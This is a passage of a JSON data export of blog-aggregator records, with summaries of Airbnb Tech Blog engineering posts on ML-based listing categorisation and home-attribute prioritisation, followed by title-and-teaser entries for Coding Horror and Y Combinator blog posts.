Quality ML score also played a role in the human review prioritization logic. With all three ML models functional for all three human review tasks, we could now streamline the review process and send more candidates directly to production, while also prioritizing some for human review. This prioritization plays an important role in the system because listings that are vetted by humans may rank higher in the category\u00a0feed.There were several factors to consider when prioritizing listings for human review, including listing category confidence score, listing quality, bookability and popularity of the region. The best strategy proved to be a combination of those factors. In Figure 9 we show the top candidates for human review for several categories at the time of writing this\u00a0post.Figure 9: Listing prioritized for review in 4 different categoriesOnce graded, those labels are then used for periodical model re-training in an active feedback loop that continuously improves the category accuracy and coverage.Future workOur future work involves iterating on the three ML models in several directions, including generating a larger set of labels using generative vision models and potentially combining them into a single multi-task model. We are also exploring ways of using Large Language Models (LLMs) for conducting category review\u00a0tasksIf this type of work interests you, check out some of our related\u00a0roles!Building Airbnb Categories with ML & Human in the Loop was originally published in The Airbnb Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.", "content": "", "cover_photo_url": "https://miro.medium.com/v2/resize:fit:1200/1*QYv0Kr3gpdWJFtzPgqkwJA.jpeg", "profile": 3, "updated_on": "2023-03-22T22:03:24Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12122.4032744, "slug": "building-airbnb-categories-with-ml-human-in-the-loop-110", "topics": [26, 19, 32, 9]}}, {"model": "app.post", "pk": 111, "fields": {"title": "Prioritizing Home Attributes Based on Guest Interest", "link": "https://medium.com/airbnb-engineering/prioritizing-home-attributes-based-on-guest-interest-3c49b827e51a?source=rss----53c7c27702d5---4", "source": 1, "normalized_link": "medium.com/airbnb-engineering/prioritizing-home-attributes-based-on-guest-interest-3c49b827e51a", "summary": "How Airbnb leverages ML to derive guest interest from unstructured text data and provide personalized recommendations to\u00a0HostsBy: Joy Jing and Jing\u00a0XiaAt Airbnb, we endeavor to build a world where anyone can belong anywhere. We strive to understand what our guests care about and match them with Hosts who can provide what they are looking for. What better source for guest preferences than the guests themselves?We built a system called the Attribute Prioritization System (APS) to listen to our guests\u2019 needs in a home: What are they requesting in messages to Hosts? What are they commenting on in reviews? What are common requests when calling customer support? And how does it differ by the home\u2019s location, property type, price, as well as guests\u2019 travel\u00a0needs?With this personalized understanding of what home amenities, facilities, and location features (i.e. \u201chome attributes\u201d) matter most to our guests, we advise Hosts on which home attributes to acquire, merchandize, and verify. We can also display to guests the home attributes that are most relevant to their destination and\u00a0needs.We do this through a scalable, platformized, and data-driven engineering system. This blog post describes the science and engineering behind the\u00a0system.What do guests care\u00a0about?First, to determine what matters most to our guests in a home, we look at what guests request, comment on, and contact customer support about the most. Are they asking a Host whether they have wifi, free parking, a private hot tub, or access to the\u00a0beach?To parse this unstructured data at scale, Airbnb built LATEX (Listing ATtribute EXtraction), a machine learning system that can extract home attributes from unstructured text data like guest messages and reviews, customer support tickets, and listing descriptions. LATEX accomplishes this in two\u00a0steps:A named entity recognition (NER) module extracts key phrases from unstructured text\u00a0dataAn entity mapping module then maps these key phrases to home attributesThe named entity recognition (NER) module uses textCNN (convolutional neural network for text) and is trained and fine tuned on human labeled text data from various data sources within Airbnb. In the training dataset, we label each phrase that falls into the following five categories: Amenity, Activity, Event, Specific POI (i.e. \u201cLake Tahoe\u201d), or generic POI (i.e. \u201cpost office\u201d).The entity mapping module uses an unsupervised learning approach to map these phrases to home attributes. To achieve this, we compute the cosine distance between the candidate phrase and the attribute label in the fine-tuned word embedding space. We consider the closest mapping to be the referenced attribute, and can calculate a confidence score for the\u00a0mapping.We then calculate how frequently an entity is referenced in each text source (i.e. messages, reviews, customer service tickets), and aggregate the normalized frequency across text sources. Home attributes with many mentions are considered more important.With this system, we are able to gain insight into what guests are interested in, even highlighting new entities that we may not yet support. The scalable engineering system also allows us to improve the model by onboarding additional data sources and languages.An example of a listing\u2019s description with keywords highlighted and labeled by the Latex NER\u00a0model.What do guests care about for different types of\u00a0homes?What guests look for in a mountain cabin is different from an urban apartment. Gaining a more complete understanding of guests\u2019 needs in an Airbnb home enables us to provide more personalized guidance to\u00a0Hosts.To achieve this, we calculate a unique ranking of attributes for each home. Based on the characteristics of a home\u2013location, property type, capacity, luxury level, etc\u2013we predict how frequently each attribute will be mentioned in messages, reviews, and customer service tickets. We then use these predicted frequencies to calculate a customized importance score that is used to rank all possible attributes of a\u00a0home.For example, let us consider a mountain cabin that can host six people with an average daily price of $50. In determining what is most important for potential guests, we learn from what is most talked about for other homes that share these same characteristics. The result: hot tub, fire pit, lake view, mountain view, grill, and kayak. In contrast, what\u2019s important for an urban apartment are: parking, restaurants, grocery stores, and subway stations.Image: An example image of a mountain cabin\u00a0homeAn example of home attributes ranked for a mountain cabin vs an urban apartment.Image: An example of an urban apartment homeWe could directly aggregate the frequency of keyword usage amongst similar homes. But this approach would run into issues at scale; the cardinality of our home segments could grow exponentially large, with sparse data in very unique segments. Instead, we built an inference model that uses the raw keyword frequency data to infer the expected frequency for a segment. This inference approach is scalable as we use finer and more dimensions to characterize our homes. This allows us to support our Hosts to best highlight their unique and diverse collection of\u00a0homes.How can guests\u2019 preferences help Hosts\u00a0improve?Now that we have a granular understanding of what guests want, we can help Hosts showcase what guests are looking for\u00a0by:Recommending that Hosts acquire an amenity guests often request (i.e. coffee\u00a0maker)Merchandizing an existing home attribute that guests tend to comment favorably on in reviews (i.e.\u00a0patio)Clarifying popular facilities that may end up in requests to customer support (i.e. the privacy and ability to access a\u00a0pool)But to make these recommendations relevant, it\u2019s not enough to know what guests want. We also need to be sure about what\u2019s already in the home. This turns out to be trickier than asking the Host due to the 800+ home attributes we collect. Most Hosts aren\u2019t able to immediately and accurately add all of the attributes their home has, especially since amenities like a crib mean different things to different people. To fill in some of the gaps, we leverage guests feedback for amenities and facilities they have seen or used. In addition, some home attributes are available from trustworthy third parties, such as real estate or geolocation databases that can provide square footage, bedroom count, or if the home is overlooking a lake or beach. We\u2019re able to build a truly complete picture of a home by leveraging data from our Hosts, guests, and trustworthy third\u00a0parties.We utilize several different models, including a Bayesian inference model that increases in confidence as more guests confirm that the home has an attribute. We also leverage a supervised neural network WiDeText machine learning model that uses features about the home to predict the likelihood that the next guest will confirm the attribute\u2019s existence.Together with our estimate of how important certain home attributes are for a home, and the likelihood that the home attribute already exists or needs clarification, we are able to give personalized and relevant recommendations to Hosts on what to acquire, merchandize, and clarify when promoting their home on\u00a0Airbnb.Cards shown to Hosts to better promote their listings.What\u2019s next?This is the first time we\u2019ve known what attributes our guests want down to the home level. What\u2019s important varies greatly based on home location and trip\u00a0type.This full-stack prioritization system has allowed us to give more relevant and personalized advice to Hosts, to merchandize what guests are looking for, and to accurately represent popular and contentious attributes. When Hosts accurately describe their homes and highlight what guests care about, guests can find their perfect vacation home more\u00a0easily.We are currently experimenting with highlighting amenities that are most important for each type of home (i.e. kayak for mountain cabin, parking for urban apartment) on the home\u2019s product description page. We believe we can leverage the knowledge gained to improve search and to determine which home attributes are most important for different categories of\u00a0homes.On the Host side, we\u2019re expanding this prioritization methodology to encompass additional tips and insights into how Hosts can make their listings even more desirable. This includes actions like freeing up popular nights, offering discounts, and adjusting settings. By leveraging unstructured text data to help guests connect with their perfect Host and home, we hope to foster a world where anyone can belong anywhere.If this type of work interests you, check out some of our related positions at Careers at\u00a0Airbnb!AcknowledgmentsIt takes a village to build such a robust full-stack platform. Special thanks to (alphabetical by last name) Usman Abbasi, Dean Chen, Guillaume Guy, Noah Hendrix, Hongwei Li, Xiao Li, Sara Liu, Qianru Ma, Dan Nguyen, Martin Nguyen, Brennan Polley, Federico Ponte, Jose Rodriguez, Peng Wang, Rongru Yan, Meng Yu, Lu Zhang for their contributions, dedication, expertise, and thoughtfulness!Prioritizing Home Attributes Based on Guest Interest was originally published in The Airbnb Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.", "content": "", "cover_photo_url": "https://miro.medium.com/v2/resize:fit:1200/1*yoNhrvu8spSI6SuHSCbSkQ.jpeg", "profile": 3, "updated_on": "2023-02-16T17:05:39Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12056.7262744, "slug": "prioritizing-home-attributes-based-on-guest-interest-111", "topics": [50, 47, 48, 49, 9]}}, {"model": "app.post", "pk": 112, "fields": {"title": "The 2030 Self-Driving Car Bet", "link": "https://blog.codinghorror.com/the-2030-self-driving-car-bet/", "source": 1, "normalized_link": "blog.codinghorror.com/the-2030-self-driving-car-bet", "summary": "It's my honor to announce that John Carmack and I have initiated a friendly bet of $10,000* to the 501(c)(3) charity of the winner\u2019s choice:By January 1st, 2030, completely autonomous self-driving cars meeting SAE J3016 level 5 will be commercially available for", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2022-03-04T18:53:32Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11386.7901189, "slug": "the-2030-self-driving-car-bet-112", "topics": []}}, {"model": "app.post", "pk": 113, "fields": {"title": "Updating The Single Most Influential Book of the BASIC Era", "link": "https://blog.codinghorror.com/updating-the-single-most-influential-book-of-the-basic-era/", "source": 1, "normalized_link": "blog.codinghorror.com/updating-the-single-most-influential-book-of-the-basic-era", "summary": "In a way, these two books are responsible for my entire professional career.With early computers, you didn't boot up to a fancy schmancy desktop, or a screen full of apps you could easily poke and prod with your finger. No, those computers booted up to the command", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2021-12-31T23:49:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 11266.2240744, "slug": "updating-the-single-most-influential-book-of-the-basic-era-113", "topics": []}}, {"model": "app.post", "pk": 114, "fields": {"title": "Building a PC, Part IX: Downsizing", "link": "https://blog.codinghorror.com/building-a-pc-part-ix-downsizing/", "source": 1, "normalized_link": "blog.codinghorror.com/building-a-pc-part-ix-downsizing", "summary": "Hard to believe that I've had the same PC case since 2011, and my last serious upgrade was in 2015. I guess that's yet another sign that the PC is over, because PC upgrades have gotten really boring. It took 5 years for me to muster", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2020-04-19T23:56:03Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 10073.9134744, "slug": "building-a-pc-part-ix-downsizing-114", "topics": []}}, {"model": "app.post", "pk": 115, "fields": {"title": "The Rise of the Electric Scooter", "link": "https://blog.codinghorror.com/the-rise-of-the-electric-scooter/", "source": 1, "normalized_link": "blog.codinghorror.com/the-rise-of-the-electric-scooter", "summary": "In an electric car, the (enormous) battery is a major part of the price.  If electric car prices are decreasing, battery costs must be decreasing, because it's not like the cost of fabricating rubber, aluminum, glass, and steel into car shapes can decline that much, right?  On an", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2019-09-12T07:24:32Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9650.1914522, "slug": "the-rise-of-the-electric-scooter-115", "topics": []}}, {"model": "app.post", "pk": 116, "fields": {"title": "Electric Geek Transportation Systems", "link": "https://blog.codinghorror.com/electric-geek-transportation-systems/", "source": 1, "normalized_link": "blog.codinghorror.com/electric-geek-transportation-systems", "summary": "I've never thought of myself as a \"car person\". The last new car I bought (and in fact, now that I think about it, the first new car I ever bought) was the quirky 1998 Ford Contour SVT. Since then we bought a VW station wagon", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2019-08-20T11:35:16Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9606.3657633, "slug": "electric-geek-transportation-systems-116", "topics": []}}, {"model": "app.post", "pk": 117, "fields": {"title": "An Exercise Program for the Fat Web", "link": "https://blog.codinghorror.com/an-exercise-program-for-the-fat-web/", "source": 1, "normalized_link": "blog.codinghorror.com/an-exercise-program-for-the-fat-web", "summary": "When I wrote about App-pocalypse Now in 2014, I implied the future still belonged to the web. And it does. But it's also true that the web has changed a lot in the last 10 years, much less the last 20 or 30.  Websites have gotten a lot", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2019-05-30T11:04:52Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9448.88523, "slug": "an-exercise-program-for-the-fat-web-117", "topics": []}}, {"model": "app.post", "pk": 118, "fields": {"title": "The Cloud Is Just Someone Else's Computer", "link": "https://blog.codinghorror.com/the-cloud-is-just-someone-elses-computer/", "source": 1, "normalized_link": "blog.codinghorror.com/the-cloud-is-just-someone-elses-computer", "summary": "When we started Discourse in 2013, our server requirements were high:  1GB RAM modern, fast dual core CPU speedy solid state drive with 20+ GB  I'm not talking about a cheapo shared cpanel server, either, I mean a dedicated virtual private server with those specifications. We were OK", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2019-02-17T02:15:26Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9252.3393189, "slug": "the-cloud-is-just-someone-elses-computer-118", "topics": []}}, {"model": "app.post", "pk": 119, "fields": {"title": "What does Stack Overflow want to be when it grows up?", "link": "https://blog.codinghorror.com/what-does-stack-overflow-want-to-be-when-it-grows-up/", "source": 1, "normalized_link": "blog.codinghorror.com/what-does-stack-overflow-want-to-be-when-it-grows-up", "summary": "I sometimes get asked by regular people in the actual real world what it is that I do for a living, and here's my 15 second answer:  We built a sort of Wikipedia website for computer programmers to post questions and answers. It's called Stack Overflow", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2018-10-22T10:52:32Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 9026.4687856, "slug": "what-does-stack-overflow-want-to-be-when-it-grows-up-119", "topics": []}}, {"model": "app.post", "pk": 120, "fields": {"title": "There is no longer any such thing as Computer Security", "link": "https://blog.codinghorror.com/there-is-no-longer-any-such-thing-as-computer-security/", "source": 1, "normalized_link": "blog.codinghorror.com/there-is-no-longer-any-such-thing-as-computer-security", "summary": "Remember \"cybersecurity\"?  Mysterious hooded computer guys doing mysterious hooded computer guy .. things! Who knows what kind of naughty digital mischief they might be up to? Unfortunately, we now live in a world where this kind of digital mischief is literally rewriting the world's history. For proof", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2018-09-21T09:50:53Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8966.8665856, "slug": "there-is-no-longer-any-such-thing-as-computer-security-120", "topics": []}}, {"model": "app.post", "pk": 121, "fields": {"title": "To Serve Man, with Software", "link": "https://blog.codinghorror.com/to-serve-man-with-software/", "source": 1, "normalized_link": "blog.codinghorror.com/to-serve-man-with-software", "summary": "I didn't choose to be a programmer. Somehow, it seemed, the computers chose me. For a long time, that was fine, that was enough; that was all I needed. But along the way I never felt that being a programmer was this unambiguously great-for-everyone career field with zero", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2017-12-31T02:01:52Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8459.36123, "slug": "to-serve-man-with-software-121", "topics": []}}, {"model": "app.post", "pk": 122, "fields": {"title": "The Existential Terror of Battle Royale", "link": "https://blog.codinghorror.com/the-existential-terror-of-battle-royale/", "source": 1, "normalized_link": "blog.codinghorror.com/the-existential-terror-of-battle-royale", "summary": "It's been a while since I wrote a blog post, I guess in general, but also a blog post about video games. Video games are probably the single thing most attributable to my career as a programmer, and everything else I've done professionally after that. I", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2017-11-05T10:02:53Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8352.4825856, "slug": "the-existential-terror-of-battle-royale-122", "topics": []}}, {"model": "app.post", "pk": 123, "fields": {"title": "Hacker, Hack Thyself", "link": "https://blog.codinghorror.com/hacker-hack-thyself/", "source": 1, "normalized_link": "blog.codinghorror.com/hacker-hack-thyself", "summary": "We've read so many sad stories about communities that were fatally compromised or destroyed due to security exploits. We took that lesson to heart when we founded the Discourse project; we endeavor to build open source software that is secure and safe for communities by default, even if", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2017-06-02T08:11:16Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 8052.8137633, "slug": "hacker-hack-thyself-123", "topics": []}}, {"model": "app.post", "pk": 124, "fields": {"title": "Thunderbolting Your Video Card", "link": "https://blog.codinghorror.com/thunderbolting-your-video-card/", "source": 1, "normalized_link": "blog.codinghorror.com/thunderbolting-your-video-card", "summary": "When I wrote about The Golden Age of x86 Gaming, I implied that, in the future, it might be an interesting, albeit expensive, idea to upgrade your video card via an external Thunderbolt 3 enclosure.  I'm here to report that the future is now. Yes, that's", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2017-03-24T09:08:37Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7918.49023, "slug": "thunderbolting-your-video-card-124", "topics": []}}, {"model": "app.post", "pk": 125, "fields": {"title": "Password Rules Are Bullshit", "link": "https://blog.codinghorror.com/password-rules-are-bullshit/", "source": 1, "normalized_link": "blog.codinghorror.com/password-rules-are-bullshit", "summary": "Of the many, many, many bad things about passwords, you know what the worst is? Password rules. If we don't solve the password problem for users in my lifetime I am gonna haunt you from beyond the grave as a ghost pic.twitter.com/Tf9EnwgoZv\u2014 Jeff Atwood", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2017-03-10T11:16:26Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7891.7806522, "slug": "password-rules-are-bullshit-125", "topics": []}}, {"model": "app.post", "pk": 126, "fields": {"title": "I'm Loyal to Nothing Except the Dream", "link": "https://blog.codinghorror.com/im-loyal-to-nothing-except-the-dream/", "source": 1, "normalized_link": "blog.codinghorror.com/im-loyal-to-nothing-except-the-dream", "summary": "There is much I take for granted in my life, and the normal functioning of American government is one of those things. In my 46 years, I've lived under nine different presidents. The first I remember is Carter. I've voted in every presidential election since 1992,", "content": "", "cover_photo_url": "https://blog.codinghorror.com/content/images/size/w256h256/2020/06/3cffc4b347c3587f19fe222caaac69f63b9a5e73.png", "profile": 5, "updated_on": "2017-01-30T09:19:56Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7816.7453189, "slug": "im-loyal-to-nothing-except-the-dream-126", "topics": []}}, {"model": "app.post", "pk": 127, "fields": {"title": "Peek into the latest YC batch in our new series, Founder FAQ", "link": "https://www.ycombinator.com/blog/founder-faq/", "source": 1, "normalized_link": "www.ycombinator.com/blog/founder-faq", "summary": "There are a thousand stories behind every startup. Our newest video series, Founder FAQ, aims to scratch the surface on some of these stories for the latest YC companies.", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/08/first-customer.jpeg", "profile": 1, "updated_on": "2023-08-09T17:39:56Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12390.8519856, "slug": "peek-into-the-latest-yc-batch-in-our-new-series-founder-faq-127", "topics": [51]}}, {"model": "app.post", "pk": 128, "fields": {"title": "Does your startup need to be in SF? Dalton & Michael say...", "link": "https://www.ycombinator.com/blog/dalton-michael-do-startups-need-to-be-in-san-francisco/", "source": 1, "normalized_link": "www.ycombinator.com/blog/dalton-michael-do-startups-need-to-be-in-san-francisco", "summary": "If you\u2019re starting a company, does it need to be in San Francisco? One rare aspect of this episode: it\u2019s one where Dalton and Michael disagree.", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/08/dalton-michael-sf.jpeg", "profile": 1, "updated_on": "2023-08-01T18:17:41Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12375.5423189, "slug": "does-your-startup-need-to-be-in-sf-dalton-michael-say-128", "topics": []}}, {"model": "app.post", "pk": 129, "fields": {"title": "Introducing our newest video series: Office Hours", "link": "https://www.ycombinator.com/blog/introducing-our-newest-video-series-office-hours/", "source": 1, "normalized_link": "www.ycombinator.com/blog/introducing-our-newest-video-series-office-hours", "summary": "Many of the billion dollar startups you know and love had to pivot, and that\u2019s what the first episode of our newest video series Office Hours is about.", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/07/office-hours-featured.png", "profile": 1, "updated_on": "2023-07-21T17:34:33Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12354.3648078, "slug": "introducing-our-newest-video-series-office-hours-129", "topics": [51, 52]}}, {"model": "app.post", "pk": 130, "fields": {"title": "Dalton & Michael on what AI means for the future of startups", "link": "https://www.ycombinator.com/blog/dalton-and-michael-on-ai/", "source": 1, "normalized_link": "www.ycombinator.com/blog/dalton-and-michael-on-ai", "summary": "Will ever-evolving AI models grow to consume the idea of startups as we know it, or is this the beginning of a whole new era for startups \u2014 akin to the arrival of the iPhone?", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/07/Dalton-and-Michael.png", "profile": 1, "updated_on": "2023-07-13T16:01:35Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12338.8808522, "slug": "dalton-michael-on-what-ai-means-for-the-future-of-startups-130", "topics": [53, 51]}}, {"model": "app.post", "pk": 131, "fields": {"title": "The 3 newest companies on YC\u2019s Top Revenue List and what they\u2019re doing so right", "link": "https://www.ycombinator.com/blog/the-3-newest-companies-on-ycs-top-revenue-list-and-what-theyre-doing-so-right/", "source": 1, "normalized_link": "www.ycombinator.com/blog/the-3-newest-companies-on-ycs-top-revenue-list-and-what-theyre-doing-so-right", "summary": "Co-founders from Deel, Whatnot, and Nowports share how they got started, what they focus on, and what's next", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/07/Top-Co-banner.png", "profile": 1, "updated_on": "2023-07-06T18:01:24Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12325.6006078, "slug": "the-3-newest-companies-on-ycs-top-revenue-list-and-what-theyre-doing-so-right-131", "topics": []}}, {"model": "app.post", "pk": 132, "fields": {"title": "Inaugural YC Top Companies List by Revenue", "link": "https://www.ycombinator.com/blog/yc-top-companies-list-by-revenue/", "source": 1, "normalized_link": "www.ycombinator.com/blog/yc-top-companies-list-by-revenue", "summary": "Today we\u2019re publishing a list that recognizes the companies in the YC community that achieved the highest net revenue throughout 2022. Congratulations to everyone on the inaugural YC Top Companies List by Revenue!", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/06/Top-Companies-Banner.png", "profile": 1, "updated_on": "2023-06-27T12:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12307.8387411, "slug": "inaugural-yc-top-companies-list-by-revenue-132", "topics": [54]}}, {"model": "app.post", "pk": 133, "fields": {"title": "Design Review: Aaron Epstein and Garry Tan critique AI startup websites", "link": "https://www.ycombinator.com/blog/design-review-watch-aaron-and-garry/", "source": 1, "normalized_link": "www.ycombinator.com/blog/design-review-watch-aaron-and-garry", "summary": "What are you aiming to say with your startup\u2019s website, and what\u2019s actually coming through?  Watch along as Aaron and Garry examine what\u2019s working (and what\u2019s not) on five different AI startup websites.", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/06/Design-Review-Title-Card-1.jpg", "profile": 1, "updated_on": "2023-06-15T16:36:08Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12285.1669189, "slug": "design-review-aaron-epstein-and-garry-tan-critique-ai-startup-websites-133", "topics": [55]}}, {"model": "app.post", "pk": 134, "fields": {"title": "The latest Startup School talks are now available to all", "link": "https://www.ycombinator.com/blog/startup-school-videos/", "source": 1, "normalized_link": "www.ycombinator.com/blog/startup-school-videos", "summary": "The recordings of these talks were initially available only to Startup School students. After those students told us how helpful the videos were for them, we decided to make them available to everyone.", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/05/Startup-School-title-card-2.png", "profile": 1, "updated_on": "2023-05-30T18:10:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12254.5720744, "slug": "the-latest-startup-school-talks-are-now-available-to-all-134", "topics": [56, 51, 54]}}, {"model": "app.post", "pk": 135, "fields": {"title": "Tom Blomfield of GoCardless and Monzo is our newest Group Partner", "link": "https://www.ycombinator.com/blog/tom-blomfield-of-gocardless-and-monzo-is-our-newest-group-partner/", "source": 1, "normalized_link": "www.ycombinator.com/blog/tom-blomfield-of-gocardless-and-monzo-is-our-newest-group-partner", "summary": "Introducing YC's newest Group Partner, Tom Blomfield", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/05/Tom-Blomfield-YC.png", "profile": 1, "updated_on": "2023-05-24T16:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12242.8787411, "slug": "tom-blomfield-of-gocardless-and-monzo-is-our-newest-group-partner-135", "topics": []}}, {"model": "app.post", "pk": 136, "fields": {"title": "PlanGrid and TigerEye Co-Founder Tracy Young on immigration, representation, and \u201cthe most important decision\u201d in her life", "link": "https://www.ycombinator.com/blog/plangrid-and-tigereye-co-founder-tracy-young-on-immigration-representation-and-the-most-important-decision-in-her-life/", "source": 1, "normalized_link": "www.ycombinator.com/blog/plangrid-and-tigereye-co-founder-tracy-young-on-immigration-representation-and-the-most-important-decision-in-her-life", "summary": "YC President and CEO Garry Tan sits down with PlanGrid/TigerEye co-founder Tracy Young to learn about her family's immigrant journey.", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/05/tracy_alt.jpg", "profile": 1, "updated_on": "2023-05-16T15:48:58Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12227.50403, "slug": "plangrid-and-tigereye-co-founder-tracy-young-on-immigration-representation-and-the-most-important-decision-in-her-life-136", "topics": []}}, {"model": "app.post", "pk": 137, "fields": {"title": "Welcome back to YC, Emmett Shear and Wayne Crosby", "link": "https://www.ycombinator.com/blog/welcome-back-to-yc-emmett-shear-and-wayne-crosby/", "source": 1, "normalized_link": "www.ycombinator.com/blog/welcome-back-to-yc-emmett-shear-and-wayne-crosby", "summary": "Today, we\u2019re excited to welcome Emmett Shear and Wayne Crosby as our newest Visiting Group Partners.", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/05/Emmett-Shear-Wayne-Crosby.png", "profile": 1, "updated_on": "2023-05-11T23:59:59Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12218.5587189, "slug": "welcome-back-to-yc-emmett-shear-and-wayne-crosby-137", "topics": [54]}}, {"model": "app.post", "pk": 138, "fields": {"title": "How to know if it\u2019s a good Co-Founder Match", "link": "https://www.ycombinator.com/blog/how-to-find-a-co-founder-qa-with-whalesync/", "source": 1, "normalized_link": "www.ycombinator.com/blog/how-to-find-a-co-founder-qa-with-whalesync", "summary": "Whalesync's co-founders met on YC's Co-Founder Matching Platform. We interviewed them to learn how they knew they should start a company together.", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/05/Whalesync-Featured.png", "profile": 1, "updated_on": "2023-05-10T17:30:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12216.1187411, "slug": "how-to-know-if-its-a-good-co-founder-match-138", "topics": [57]}}, {"model": "app.post", "pk": 139, "fields": {"title": "10 Questions to Discuss with a Potential Co-founder", "link": "https://www.ycombinator.com/blog/10-questions-to-discuss-with-a-potential-co-founder/", "source": 1, "normalized_link": "www.ycombinator.com/blog/10-questions-to-discuss-with-a-potential-co-founder", "summary": "When you're trying to figure out if someone is a good co-founder match, it helps to start by asking the right questions. We\u2019ve compiled a list of the 10 questions that we think are the most important ones to answer.", "content": "", "cover_photo_url": "https://www.ycombinator.com/blog/content/images/2023/04/BlogTwitter-Image-Template--2-1024_1-1.png", "profile": 1, "updated_on": "2023-04-27T16:00:00Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12191.0387411, "slug": "10-questions-to-discuss-with-a-potential-co-founder-139", "topics": []}}, {"model": "app.post", "pk": 140, "fields": {"title": "Announcing the YC Summer Conference \u2013 for students interested in startups", "link": "https://www.ycombinator.com/blog/yc-summer-conference-2023/", "source": 1, "normalized_link": "www.ycombinator.com/blog/yc-summer-conference-2023", "summary": "If you want to learn more about what it takes to start a startup \u2013 or how to get a job at one \u2013 join us for a one-day event in Mountain View, CA!", "content": "", "cover_photo_url": 